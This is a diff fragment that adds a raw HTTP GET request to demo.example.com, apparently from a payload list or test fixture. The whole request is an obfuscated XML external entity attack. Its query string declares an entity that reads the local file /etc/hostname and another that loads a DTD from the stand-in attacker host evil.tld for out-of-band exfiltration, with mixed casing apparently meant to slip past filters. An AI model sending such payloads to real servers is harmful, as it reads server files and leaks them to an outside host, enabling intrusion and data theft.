@@ -1,0 +1,4 @@
+GET /a?token=<!dOcTyPe%20DaTa%20[<!EnTiTy%20%%20FiLe%20SyStEm%20"FiLe:///EtC/hOsTnAmE"><!eNtItY%20%%20dTd%20SyStEm%20"HtTp://EvIl.TlD/oOb.DtD">%dTd;]><R/> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
